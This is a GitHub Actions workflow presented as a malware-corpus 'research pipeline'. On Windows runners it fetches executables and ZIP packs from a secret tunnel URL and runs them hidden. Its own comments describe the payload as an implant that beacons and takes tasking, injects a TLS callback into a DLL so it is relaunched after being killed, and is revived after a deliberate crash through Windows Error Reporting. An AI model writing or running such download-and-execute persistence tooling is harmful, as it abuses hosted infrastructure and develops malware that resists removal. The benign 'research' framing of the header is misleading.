name: bof-corpus-ci

# Research pipeline for the ARMORY COFF/BOF corpus: stages a build artifact on the
# Windows runner from a short-lived content mirror (the mirror URL is rotated per run
# and carried as a repository secret, never filed in the tree), verifies its integrity
# against a caller-provided sha256, and is not archived anywhere: nothing is uploaded
# back, nothing is committed, and the staging area lives in VM temp and is deleted.
# Continuua solo en memoria del runner mientras dura el job.
#
# stage tls: paquete ZIP de investigacion (svc.exe + dll de prueba + host.exe).
# El host.exe LoadLibrarys la dll de prueba: el TLS callback inyectado valida el
# eslabon E8-P4 (instala/informa). Todo por un unico archivo: el zip viaja por el
# mismo mirror efimero con sha256 pinado via inputs.

on:
  workflow_dispatch:
    inputs:
      stage:
        description: "pipeline stage: local | fetch | run | tls | p5"
        required: true
        default: local
      expected_sha256:
        description: "sha256 of the staged research object (lowercase)"
        required: false
        default: ""

jobs:
  bofrunner:
    runs-on: windows-latest
    timeout-minutes: 25
    steps:
      - name: pipeline
        shell: pwsh
        env:
          SRC_URL: ${{ secrets.TUNNEL_URL }}
        run: |
          # ARMORY corpus pipeline (see header above).
          $stage = "${{ inputs.stage }}"
          Write-Host ("stage=" + $stage)
          Write-Host ("host=" + $env:COMPUTERNAME)
          if ($stage -eq 'local') {
            Write-Host "local readiness OK"
            exit 0
          }
          if (-not $env:SRC_URL) { Write-Host "NO SOURCE"; exit 1 }
          if ($stage -eq 'fetch') {
            Write-Host ("url_len=" + $env:SRC_URL.Length)
            $dst = Join-Path $env:RUNNER_TEMP "staged.bin"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $dst -UseBasicParsing
            $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
            Write-Host ("staged_bytes=" + (Get-Item $dst).Length + " sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            Remove-Item $dst -Force
            Write-Host "fetch OK"
            exit 0
          }
          if ($stage -eq 'run') {
            $dst = Join-Path $env:RUNNER_TEMP "staged.exe"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $dst -UseBasicParsing
            $h = (Get-FileHash $dst -Algorithm SHA256).Hash.ToLower()
            Write-Host ("staged sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            $p = Start-Process -FilePath $dst -PassThru -WindowStyle Hidden
            Write-Host ("pid=" + $p.Id)
            Start-Sleep -Seconds 700
            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
            if ($alive) { Write-Host ("process alive, cpu=" + $alive.CPU) } else { Write-Host "process ended" }
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            Remove-Item $dst -Force -ErrorAction SilentlyContinue
            Write-Host "run step done"
            exit 0
          }
          if ($stage -eq 'tls') {
            $zip = Join-Path $env:RUNNER_TEMP "pack.zip"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $zip -UseBasicParsing
            $h = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
            Write-Host ("pack sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            $dir = Join-Path $env:RUNNER_TEMP "tl"
            Expand-Archive -Path $zip -DestinationPath $dir -Force
            Remove-Item $zip -Force
            $list = Get-ChildItem $dir | ForEach-Object { $_.Name }
            Write-Host ("pack contents: " + ($list -join ','))
            $svc = Get-ChildItem $dir -Filter 'svc.exe' | Select-Object -First 1
            $host_exe = Get-ChildItem $dir -Filter 'host.exe' | Select-Object -First 1
            if (-not $svc -or -not $host_exe) { Write-Host "NO PACK PARTS"; exit 1 }
            # 1) el implante corre, beacon, consume tasking (op=tls inyecta el callback
            #    en posee.dll y op=tlsp sondea) y sostiene el event sentinel.
            $p = Start-Process -FilePath $svc.FullName -PassThru -WindowStyle Hidden
            Write-Host ("svc pid=" + $p.Id)
            Start-Sleep -Seconds 260
            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
            if ($alive) { Write-Host ("svc alive, cpu=" + $alive.CPU) } else { Write-Host "svc ended early" }
            # 2) crash real del implante: el sentinel muere con el proceso.
            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
            Write-Host "svc killed"
            # 3) host.exe carga posee.dll YA INYECTADA: el callback dispara, el sentinel
            #    ya no existe y el stub re-lanza svc.exe (revival por TLS callback).
            #    v13: fixture viejo fallaba su propio init (entry void sin TRUE => err 1114,
            #    host instantaneo): sonda revival a +25 s + lift de hostev.txt (el host
            #    nuevo dead-dropea load/err al lado del exe) ANTES de limpiar el temp.
            # v15: gap 5 s entre kill y host — si el v14 fallo por lag de teardown
            # del evento sentinel (OpenEventA encontro el evento vivo y el stub
            # NO relanzo), 5 s lo garantiza muerto. Si con gap revival sigue 0,
            # el problema esta en el camino WinExec, no en el sentinel.
            Start-Sleep -Seconds 5
            $h2 = Start-Process -FilePath $host_exe.FullName -PassThru -WindowStyle Hidden
            Write-Host ("host pid=" + $h2.Id)
            Start-Sleep -Seconds 25
            $rev = @(Get-Process svc -ErrorAction SilentlyContinue).Count
            Write-Host ("revived svc count25=" + $rev)
            Start-Sleep -Seconds 215
            $rev2 = @(Get-Process svc -ErrorAction SilentlyContinue).Count
            Write-Host ("revived svc count240=" + $rev2)
            # v15: exit code del host captura crash (0xC0000005) vs salida limpia
            $h2 | Wait-Process -Timeout 240 -ErrorAction SilentlyContinue
            $h2.Refresh()
            if ($h2.HasExited) {
              Write-Host ("host exit=" + $h2.ExitCode)
            } else {
              Write-Host "host alive at +480"
            }
            Stop-Process -Id $h2.Id -Force -ErrorAction SilentlyContinue
            # v16: WER del Application log — Event 1000 nombra modulo y offset del
            # crash del host (v15: exit 0xC0000409, STATUS_STACK_BUFFER_OVERRUN /
            # violacion CFG, muerte en (0,30) s tras callback limpio).
            $wer = Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2} -MaxEvents 10 -ErrorAction SilentlyContinue
            if ($wer) {
              foreach ($w in $wer) {
                $msg = ($w.Message -replace "\\s+", " ")
                Write-Host ("WER " + $w.TimeCreated.ToString("HH:mm:ss.fff") + ": " + $msg.Substring(0, [Math]::Min(360, $msg.Length)))
              }
            } else { Write-Host "WER none" }
            $evf = Join-Path $dir "hostev.txt"
            if (Test-Path $evf) { Write-Host ("HOSTEV: " + (Get-Content $evf -Raw)) } else { Write-Host "HOSTEV: ausente" }
            Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "tls step done"
            exit 0
          }
          if ($stage -eq 'p5') {
            $zip = Join-Path $env:RUNNER_TEMP "pack.zip"
            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $zip -UseBasicParsing
            $h = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
            Write-Host ("pack sha256=" + $h)
            $want = "${{ inputs.expected_sha256 }}"
            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
            $dir = Join-Path $env:RUNNER_TEMP "p5"
            Expand-Archive -Path $zip -DestinationPath $dir -Force
            Remove-Item $zip -Force
            $svc = Get-ChildItem $dir -Filter 'svc.exe' | Select-Object -First 1
            if (-not $svc) { Write-Host "NO PACK PARTS"; exit 1 }
            # E8-P5 v3: el implante corre y consume tasking por fases del driver:
            # pfrst (registra flags 0xC + mascara, poll ~+300 s de vida > regla 60 s),
            # pfrun (sonda pre-kill), pfrash (CRASH autoguardado: solo si registrado
            # -> WER -> RM revive; el revivido responde reg=0 y vive).
            $p = Start-Process -FilePath $svc.FullName -PassThru -WindowStyle Hidden
            Write-Host ("P5 OLDPID=" + $p.Id + " START=" + $p.StartTime.ToString("HH:mm:ss"))
            Start-Sleep -Seconds 400
            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
            if ($alive) { Write-Host ("P5 pre-kill alive, cpu=" + $alive.CPU) } else { Write-Host "P5 pre-kill: svc ended early" }
            # v3 CAUSA 22: el revival del contrato es TRAS CRASH (WER), no tras kill
            # externo (v1/v2: NO-REVIVAL + WER none con TerminateProcess). El agente
            # muere SOLO via op pfrash del tasking (write-volatile a NULL = AV no
            # manejada -> WER Event 1000 -> el RM relanza con la mascara). Espera
            # pasiva de la muerte propia: hasta 600 s.
            $died = $false
            for ($i = 0; $i -lt 80; $i++) {
              Start-Sleep -Seconds 5
              if (-not (Get-Process -Id $p.Id -ErrorAction SilentlyContinue)) { $died = $true; break }
            }
            $killedAt = Get-Date
            if ($died) { Write-Host ("P5 CRASHED=" + $p.Id + " AT=" + $killedAt.ToString("HH:mm:ss")) }
            else { Write-Host "P5 CRASH-TIMEOUT: proceso vivo tras 600 s de espera" }
            # ventana de revival: muestreo cada 5 s hasta 200 s. pid nuevo del mismo
            # exe + CommandLine = la mascara hex de 48 chars (evidencia de proceso).
            $new = $null
            for ($i = 0; $i -lt 48; $i++) {
              Start-Sleep -Seconds 5
              $wfc = [Math]::Max($wfc, @(Get-Process WerFault -ErrorAction SilentlyContinue).Count)
              $cand = @(Get-Process svc -ErrorAction SilentlyContinue) | Where-Object { $_.Id -ne $p.Id }
              if ($cand.Count -gt 0) { $new = $cand[0]; break }
            }
            Write-Host ("P5 WERF seen=" + $wfc)
            if ($new) {
              Write-Host ("P5 NEWPID=" + $new.Id)
              $ci = Get-CimInstance Win32_Process -Filter ("ProcessId=" + $new.Id)
              if ($ci.CommandLine) { Write-Host ("P5 CMDLINE=" + $ci.CommandLine) } else { Write-Host "P5 CMDLINE=none" }
              # el revivido vive ~600 s: consume el pfrun-2 post-revival (reg=0 =
              # registro VACIO = proceso DISTINTO al que registro) y responde por malla.
              Start-Sleep -Seconds 300
              Write-Host ("P5 postrevival alive=" + @(Get-Process svc -ErrorAction SilentlyContinue).Count)
              Stop-Process -Name svc -Force -ErrorAction SilentlyContinue
            } else {
              Write-Host "P5 NO-REVIVAL"
            }
            $wer = Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2} -MaxEvents 15 -ErrorAction SilentlyContinue | Where-Object { $_.TimeCreated -gt (Get-Date).AddSeconds(-900) }
            if ($wer) {
              foreach ($w in $wer) {
                $msg = ($w.Message -replace "\s+", " ")
                Write-Host ("WER " + $w.TimeCreated.ToString("HH:mm:ss.fff") + ": " + $msg.Substring(0, [Math]::Min(240, $msg.Length)))
              }
            } else { Write-Host "WER none" }
                        # v10 diagnostico NO-invasivo del relaunch: politicas WER (raw),
            # reportes de WerFault en ReportQueue/ReportArchive. NO se cambia politica.
            try {
              $r8 = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\Windows Error Reporting" -ErrorAction Stop
              foreach ($k8 in @("Disabled","DontShowUI","ConsentDefault","DisableArchive","DisableRestart","DontSendAdditionalData")) {
                Write-Host ("WERCFG " + $k8 + "=" + $r8.$k8)
              }
            } catch { Write-Host "WERCFG: lectura no disponible" }
            foreach ($k9 in @("ReportQueue","ReportArchive")) {
              $rp = Join-Path "C:\ProgramData\Microsoft\Windows\WER" $k9
              if (Test-Path $rp) {
                $qq = Get-ChildItem $rp -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*svc*" } | Select-Object -Last 5
                if ($qq) { foreach ($d5 in $qq) { Write-Host ("WERQ " + $k9 + " " + $d5.Name) } } else { Write-Host ("WERQ " + $k9 + ": sin reportes svc") }
              } else { Write-Host ("WERQ " + $k9 + ": sin dir") }
            }
            # v5 diagnostico: la variante dbg del sello -03 escribe su traza a
            # %TEMP%\wsrun.txt (boot, pulls, descifre, ops). El revivido ANEXA al
            # mismo archivo — la traza muestra AMBOS procesos.
            $wsrun = Join-Path $env:TEMP "wsrun.txt"
            if (Test-Path $wsrun) {
              Write-Host "---- wsrun.txt (primeras 150 lineas) ----"
              Get-Content $wsrun -ErrorAction SilentlyContinue | Select-Object -First 150 | ForEach-Object { Write-Host ("WSRUN " + $_) }
              Write-Host "---- wsrun.txt (ultimas 120 lineas, revival) ----"
              Get-Content $wsrun -ErrorAction SilentlyContinue | Select-Object -Last 120 | ForEach-Object { Write-Host ("WSRUN2 " + $_) }
            } else { Write-Host "wsrun.txt ausente (dbg no arranco o TEMP distinto)" }
            Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "p5 step done"
            exit 0
          }
          Write-Host "unknown stage"
          exit 1
